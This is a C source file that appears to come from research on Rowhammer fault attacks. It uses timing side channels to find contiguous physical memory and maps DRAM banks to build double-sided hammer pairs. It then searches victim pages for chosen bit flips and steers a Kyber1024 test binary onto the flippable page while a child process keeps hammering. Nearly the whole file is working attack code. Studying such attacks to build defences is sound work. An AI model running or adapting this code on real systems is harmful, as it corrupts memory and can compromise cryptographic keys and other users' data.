#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>			// uint64_t
#include <stdlib.h>			// For malloc
#include <string.h>			// For memset
#include <time.h>
#include <fcntl.h>			// For O_RDONLY in get_physical_addr fn 
#include <unistd.h>			// For pread in get_physical_addr fn, for usleep
#include <sys/mman.h>
#include <stdbool.h>		// For bool
#include <inttypes.h>
#include <immintrin.h>
#include <errno.h>
#include <assert.h>
#include <sched.h>
#include "rowhammer_utils.h"

#define POSIX_ALIGN (1<<22)
#define ROUNDS 100
#define ROUNDS2 10000
#define PAGE_COUNT 256 * 4 * (uint64_t)256	// ARG2 is the buffer size in MB // 
// #define PAGE_SIZE 4096
#define PEAKS PAGE_COUNT/256*2

#define E_OFFSET 0x0b0


#define HASH_FN_CNT 4
#define ROW_SIZE 		(1<<13)

#define MEM_SIZE 256
#define HUGE_SIZE (1<<21)

typedef struct {
	uint64_t lst[HASH_FN_CNT];
	uint64_t len;
}AddrFns;

typedef struct {
	AddrFns h_fns;
	uint64_t row_mask;
	uint64_t col_mask;
}DRAMLayout;


typedef struct{
    uint64_t num_conf;
    char** conflicts;
}contig_rows;

typedef struct {
   char* base;
   contig_rows* bank_contig_rows; // array of conflict array (e.g. conflict_bank[0] is an array of all the addresses that conflict in bank 0. Each 4 addresses in that row will belong to a single row)
   uint64_t virt_offset; // the virtual addr offset from eg. a virtual address that thas 21 trailing zeroes has a virtual offset of 0. Helps with virt2dram but not abs necessary
}contig_chunk;

typedef struct{
    char* aggressors[8];
    char* victims[4];
}ds_pair; // this struct will hold all the relevant base addresses for a double-sided hammer

typedef struct{
    ds_pair* pairs[16];
    int num_pairs[16]; 
}bank_pairs;

bank_pairs bank_pairs_arr;


DRAMLayout      g_mem_layout = {{{0x2040,0x24000,0x48000,0x90000}, 4}, 0x3fffe0000, ROW_SIZE-1};

int num_blocks;

char** agg;
int prehammer_val=0;
char* tgt_page=0;

// Measure_read
#define measure(_memory, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "rdtscp;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%eax;"\
   "rdtscp;"\
   "mfence;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)


u_int64_t get_bank(uint64_t v_addr, uint64_t offset){

   uint64_t addr = v_addr - offset;
    uint64_t bank=0;
    for (int i = 0; i < g_mem_layout.h_fns.len; i++) {
		
		bank |= (__builtin_parityl(addr & g_mem_layout.h_fns.lst[i]) <<i);
	}
    return bank;
}

///thp code 
uint64_t get_dram_row_thp(uint64_t v_addr, uint64_t offset)
{  
   uint64_t addr = v_addr - offset;
	uint64_t row_mask = (HUGE_SIZE -1) & g_mem_layout.row_mask;
	return (addr & row_mask) >> __builtin_ctzl(row_mask);
}



// finds all pages that row conflict with the base_page
void find_bank_conflict(contig_chunk* mem_chunk, int target_bank){

    // find a base address in the target bank
    
    u_int64_t base;
    u_int64_t curr;
    uint64_t phys;
    int ndx=0;
    for(int i=0; i< MEM_SIZE; i++){
        int found_base=0;
        for(int j=0; j<2; j++){
            base = (uint64_t)mem_chunk->base + i*PAGE_SIZE + 64*j;
            if(get_bank(base, mem_chunk->virt_offset) == target_bank){
                // printf("Found base\n");
                found_base=1;
                break;
            }
        }
        if(found_base){break;}
    }
    mem_chunk->bank_contig_rows[target_bank].conflicts = (char**) malloc(sizeof(char*) * 300);
    
    

 
   
    // printf("starting row conflict\n");
    for(int i=0; i<MEM_SIZE; i++){
        for (int v=0; v< 2; v++){
            curr = (uint64_t) mem_chunk->base + (i*PAGE_SIZE) + 64*v;
            if(curr == base){continue;}
            
          
            
            if(get_bank(base,mem_chunk->virt_offset) == get_bank(curr,mem_chunk->virt_offset)){
                mem_chunk->bank_contig_rows[target_bank].conflicts[ndx] = (char*)curr;
                // printf("Get DRAM row: %lx\n",get_dram_row_thp((u_int64_t)curr));
                // printf("Get BANK: %lx\n",get_bank((u_int64_t)curr));
                ndx++;
            }
        }

        
        

    }
    
    // if(ndx < 100){printf("less than 100 found\n"); exit(0);}
    mem_chunk->bank_contig_rows[target_bank].num_conf =ndx;
    return ;
}

// takes in all the memory chunks and returns a pointer to a list of hammering pairs
// the list is to be used in templating
// so this function is just for organizing things
int create_hammer_pairs(contig_chunk* chunks, int target_bank, ds_pair* pairs_array){
    // ds_pair* pairs_array = (ds_pair*) malloc(200*sizeof(ds_pair));
    int pair_ndx=0;

    for(int i=0; i< num_blocks; i++){ // go through the conflict array of the target bank of each chunk. The conflict array is basically a list of contig memory rows
        if(chunks[i].bank_contig_rows[target_bank].num_conf < 12){continue;} // if the chunk doesn't have a full 3 rows for double sided, skip it
        int ndx=0;
        int agg_parity=0;
        while((ndx*4) <= chunks[i].bank_contig_rows[target_bank].num_conf  -4){
            if((ndx%2) == 0){
                // aggressors
                pairs_array[pair_ndx].aggressors[0 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].aggressors[1 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].aggressors[2 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].aggressors[3 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];

                if(agg_parity == 1){
                    // completed an agg pair
                    pair_ndx++;
                }
                agg_parity = agg_parity ^ 1;

            }else{
                pairs_array[pair_ndx].victims[0] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].victims[1] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].victims[2] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].victims[3] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];
            }
            ndx++;
        }
        
    }
    
    return pair_ndx;
}

void fill_victims(ds_pair* pairs_array, int num_pairs){
    for(int i=0; i< num_pairs; i++){
        char* addr =  (char*) (((uint64_t)  pairs_array[i].victims[0])  &(~(PAGE_SIZE-1)) );
        char* addr2 = (char*) (((uint64_t)  pairs_array[i].victims[1])  &(~(PAGE_SIZE-1)) );
        char* addr3 = (char*) (((uint64_t)  pairs_array[i].victims[2])  &(~(PAGE_SIZE-1)) );
        char* addr4 = (char*) (((uint64_t)  pairs_array[i].victims[3])  &(~(PAGE_SIZE-1)) );
        memset(addr, 0x00, PAGE_SIZE);
        memset(addr2, 0x00, PAGE_SIZE);
        memset(addr3, 0x00, PAGE_SIZE);
        memset(addr4, 0x00, PAGE_SIZE);
        
        flush_chunck(addr,PAGE_SIZE);
        flush_chunck(addr2,PAGE_SIZE);
        flush_chunck(addr3,PAGE_SIZE);
        flush_chunck(addr4,PAGE_SIZE);
    }
    return;
}




int check_victims(ds_pair* pairs_array, int num_pairs){
    int flip_0 =0;
    int flip_1 =1;
    int bad = 0;
    int num_flips =0;
    for(int i=0; i< num_pairs; i++){
        for(int j=0; j < 4; j++){
            char* addr = (char*) (((uint64_t) pairs_array[i].victims[j]) &(~(PAGE_SIZE-1)) );
            flip_0 = 0;
            flip_1 = 0;
            bad = 0;
            num_flips=0;
            
            for(int n=E_OFFSET; n<(E_OFFSET+2048); n++){
                
                if( (uint8_t) addr[n] != 0x00 ){
                    
                    printf("FLIP in addr (%lx): %hhx\n",(u_int64_t)(addr + n), addr[n]);
                    num_flips++;

                    if( (n%2==0) && ((uint8_t) addr[n] == 0x40) ) { // using ndx for odd and even index bytes because the page offset of e is aligned e.g. 0x1e0, 0x1c0..etc
                        printf("Got flip-0\n");
                        flip_0 = 1;
                        
                    }else if( (n%2==1) && ((uint8_t)addr[n] == 0x01))  {
                        printf("Got flip-1\n");
                        flip_1=1;
                        
                    }else{bad=1;}
                }

            }
            // if(num_flips > 0){
            //         tgt_page = addr;
            //         return 1;
            // }

            if(flip_0 &(flip_1)){
                tgt_page = addr;
                return 1;
            }
        }   
    }
    return 0;

}


int multi_bank(){
    char** agg_list = malloc(20*sizeof(char*));
   for(int bank1=0; bank1<16; bank1++){
       for(int bank2=(bank1+1); bank2<16; bank2++){
           int bank1_start=0;
           int bank2_start=0;
           int bank1_end=0;
           int bank2_end=0;
           int ndx=0;
           while((bank1_end < bank_pairs_arr.num_pairs[bank1]) &&  (bank2_end < bank_pairs_arr.num_pairs[bank2])){
            //    agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
            //    agg_list[ndx+2] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
            //    agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               
               agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
                agg_list[ndx+1] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
               agg_list[ndx+2] =  bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
               agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               ndx+=4;
               bank1_end++;
               bank2_end++;
               if(ndx>=20){
                //    printf("%d  aggressors\n", ndx);
                //    for(int i=0; i<ndx; i++){
                       
                //        printf("Bank %ld:\n", get_bank((u_int64_t) agg_list[i]));
                //     }
                   // fill the victims
                   fill_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1]);
                   fill_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2]);
                   // hammer
                    hammer_thp_prehammer(agg_list, 0, 20);
                   // scan the victims
                   if(check_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1])){
                       agg=agg_list;
                       return 1;
                   }
                   if(check_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2])){
                       agg=agg_list;
                       return 1;
                   }
                   
                   
                  // reset
                  ndx=0;
                  bank1_end = bank1_start+3;
                  bank1_start+=3;
                  bank2_end = bank2_start+3;
                  bank2_start+=3;
               }

           }
       }
   }
   return 0;
}

int single_bank(){
    char** agg_list = malloc(20*sizeof(char*));
    for(int bank1=0; bank1<16; bank1++){
        int bank1_start=0;
        int bank1_end=0;
        int ndx=0;
        while((bank1_end < bank_pairs_arr.num_pairs[bank1])){
            agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            agg_list[ndx+1] =  bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
            ndx+=2;
            bank1_end++;
            if(ndx >=10){
                fill_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1]);
                hammer_thp_prehammer(agg_list, 0, 10);
                // multi_sided(agg_list, 10);
                if(check_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1])){
                    agg=agg_list;
                    return 1;
                }

                ndx=0;
                // bank1_end = bank1_start+3;
                // bank1_start+=3;
            }
        }
    }
    return 0;

}

int main(void){

	int peaks[PEAKS] = {0};
	int peak_index = 0;
	int apart[PEAKS] = {0};
	uint32_t t1 = 0;
	uint32_t t2 = 0;
	uint32_t tt = 0;
	uint64_t total = 0;
	int t2_prev;
	clock_t cl;
	clock_t cl2;
	float pre_time = 0.0;
	float online_time = 0.0;
	
	// Allocating memories
	uint8_t * evictionBuffer;
	evictionBuffer = mmap(NULL, PAGE_COUNT * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); // the actual memory that we wiill detect withint it the contig memory
	//memset(evictionBuffer, 0xff, PAGE_COUNT * PAGE_SIZE);
	uint16_t * measurementBuffer;
	measurementBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));
	// uint16_t * conflictBuffer;
	// conflictBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));

   printf("PAGE COUNT %ld\n", PAGE_COUNT);
   printf("PEAKS  %ld\n", PEAKS);
   printf("ROUNDS %d\n", ROUNDS);
	printf("Hello world %ld \n", PEAKS);

   char * base;
   posix_memalign((void **)(&(base)), (POSIX_ALIGN), PAGE_SIZE);
   if(madvise(base, POSIX_ALIGN, MADV_HUGEPAGE) == -1)
		{
			fprintf(stderr, "MADV  Failed: %d\n", errno);
            
		}
   memset(base,0xFF, PAGE_SIZE);
   printf("Base %lx\n", get_physical_addr((uint64_t) base));

   
	////////////////////////////////SPOILER////////////////////////////////////
	// Warmup loop to avoid initial spike in timings
	for (int i = 0; i < 100000000; i++); 
	
	#define WINDOW 64
	#define THRESH_OUTLIER 2000	// Adjust after looking at outliers in t2.txt
					//
								// Uncomment writing t2.txt part
	#define THRESH_LOW 600		// Adjust after looking at diff(t2.txt)
	#define THRESH_HI 900		// Adjust after looking at diff(t2.txt)
	
	int cont_start = 0;			// Starting and ending page # for cont_mem
	int cont_end = 0;
	
	t2_prev = 0;
	cl = clock();
	for (int p = WINDOW; p < PAGE_COUNT; p++) // start at 64 then do a sweep all the way to 0, then at 65 then sweep to 1, .....
	{
		total = 0;
		int cc = 0;

		for (int r = 0; r < ROUNDS; r++)		// do the measurement 100 times
		{
			for(int i = WINDOW; i >= 0; i--)
			{
				evictionBuffer[(p-i)*PAGE_SIZE] = 0;  // store the first block of each page in the current window, The window is the 64 pages before p
			}

			measure(base, &tt);           // measure the time taken to access the same memory address. Using base since we know it's 20 lsb bits of pa
			if (tt < THRESH_OUTLIER) // is this an outlier?
			{
				total = total + tt;
				cc++;  
        }   }
		
		if (cc != 0) { // if this iis not an outlier
			measurementBuffer[p] = total / cc;  // take the average measuement time
		
			// Extracting the peaks
			if (total/cc-t2_prev > THRESH_LOW && total/cc-t2_prev < THRESH_HI) // is this a peak?
			{
				peaks[peak_index] = p;
				peak_index++;
			}
		
			t2_prev = total / cc;
		}else{
			measurementBuffer[p] = total / ROUNDS;
			t2_prev = total/ROUNDS;
		}
	}
	
    FILE *t2_file;
	t2_file = fopen("alias_1MB.txt", "w");
	if(1){
		for(int p = 0; p < PAGE_COUNT; p++)
			fprintf(t2_file, "%u\n", measurementBuffer[p]);
           
	}
	
  
      
	// distance between peaks
	for (int j = 0; j < peak_index - 1; j++){
		apart[j] = peaks[j+1] - peaks[j];
        fprintf(t2_file, "%u\t%u\t%u\n", apart[j],peaks[j], peaks[j+1]);
		
	}

    FILE *pa_file;
    pa_file = fopen("physical_address.txt", "w");
    for (int p = 0; p < PAGE_COUNT; p++){
        uint64_t physical_addr = get_physical_addr((uint64_t)&evictionBuffer[p*PAGE_SIZE]);
        fprintf(pa_file, "%lx\n", physical_addr);
    }
    fclose(pa_file);


   // find the indices where there is a long continous string of 256
   int start = 0;
   int end = 0;
   int cont_len_max=0; // how many cont 256 in a row have we seen
   int temp_start=0;
   int temp_end=0;
   int cont_len_curr=0;
   for(int i=0; i<peak_index -1; i++){
      if(apart[i] == 256){
         if(cont_len_curr == 0){
            temp_start =i;
         }
         temp_end=i;
         cont_len_curr++;
      }else{
         cont_len_curr=0;
      }
      if(cont_len_curr > cont_len_max){
         start = temp_start;
         end = temp_end;
         cont_len_max = cont_len_curr;
      }

   }
   // print the start and end
   printf("start: %d\n", peaks[start]); 
   printf("end: %d\n", peaks[end]); 
   printf("Cont len max: %d\n", cont_len_max);

   printf("Aligned addresses ........\n");
   for(int i=start; i< end+1; i++){
      printf("%d - %lx\n",i, get_physical_addr((uint64_t) evictionBuffer + (peaks[i]*PAGE_SIZE)));
   }

    // exit(0);
   

   // setup the chunks struct
   num_blocks  = cont_len_max;
   contig_chunk* chunks = malloc( num_blocks* sizeof(contig_chunk));
   for(int i=0; i< num_blocks; i++){
      chunks[i].base = evictionBuffer + peaks[start+i]*PAGE_SIZE;
      chunks[i].virt_offset = ((uint64_t)(evictionBuffer+peaks[start+i]*PAGE_SIZE))  & ((1<<20)-1); // the last 20 bits of the va
      chunks[i].bank_contig_rows = malloc(sizeof(contig_rows)*16);
      memset(chunks[i].base, 0xFF, MEM_SIZE*PAGE_SIZE);
   }
    

   ////////////////////////TEMPLATE/////////////////////////////////////////////////////////
   for(int j=0; j < 16; j++){
      ds_pair* pairs_array = (ds_pair*) malloc(400*sizeof(ds_pair));
      
      // printf("//////////////////////Conflict for Bank %d////////////////////////////\n", j);
      for(int i=0; i < num_blocks; i++){
            // printf("-------------Chunk %d------------------------\n", i);
            find_bank_conflict(&chunks[i], j);
      }
      // printf("//////////////////////Create Pairs.....................\n");
      int num_pairs = create_hammer_pairs(chunks, j, pairs_array); //create a list of double sided pairs
      bank_pairs_arr.pairs[j] = pairs_array;
      bank_pairs_arr.num_pairs[j] = num_pairs;
      printf("Bank %d Num %d\n", j, num_pairs);
        
   }
   
   if(!(single_bank())){    
       printf("Exit\n");
     exit(0);
   }
   
	
   
   //////////////////////////////////MASSAGE////////////////////////////////////////////////////////////// 
   printf("Tgt: %lx\n", get_physical_addr((uint64_t) tgt_page));
   int dummy_num = 400;
   char* dummies =  (char *) mmap(NULL, dummy_num*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);

   printf("dummies.......\n");
	for(int i=0; i<dummy_num; i++){
		printf("%d - %lx\n", i, get_physical_addr((uintptr_t) dummies+i*PAGE_SIZE));
	}
   


   // // hammering and maneuouvers
    cpu_set_t  mask;
    CPU_ZERO(&mask);
    CPU_SET(2, &mask);
    int r;


    if(fork() == 0){
		printf("I am the child\n");
		
		
		//  touch the target
        
		memset(tgt_page, 0xFF, PAGE_SIZE);
        

		for(int i=0; i< dummy_num; i++){
			memset(dummies + i*PAGE_SIZE, 0xFF,1<<12);
		}

		
        
        
		uint64_t w=0;
		// while(w<5000000){w++;}

		while(1){
                if(w<30){
                    hammer_thp_prehammer(agg, 0, 10);
                }
                
                // multi_sided(agg, 10);
            
            
			
			
			w++;
		}
		
			
	}else{
		usleep(2000);
        // move to a different physical core
        r = sched_setaffinity(getpid(),sizeof(mask),&mask);
		

        
		for(int i=0; i< 124; i++){
			munmap(dummies + i*PAGE_SIZE, PAGE_SIZE);
		}   

     



		// release the target
        munmap(tgt_page, PAGE_SIZE);

        //   for(int i=0; i< num_blocks; i++){
        //     int m = madvise(chunks[i].base, MEM_SIZE, MADV_DONTNEED);
        // }

		
		// release the dummies
		for(int i=124; i< dummy_num-1; i++){
			munmap(dummies + i*PAGE_SIZE, PAGE_SIZE);
		}

      
       
      //   usleep(4000);

		system("sudo taskset 0x4 ../../test_kyber1024 > kyber_out.txt");
        // system("taskset 0x4 ../../test_kyber1024 > kyber_out.txt");
		
		
		
	}


	
	return 0;
}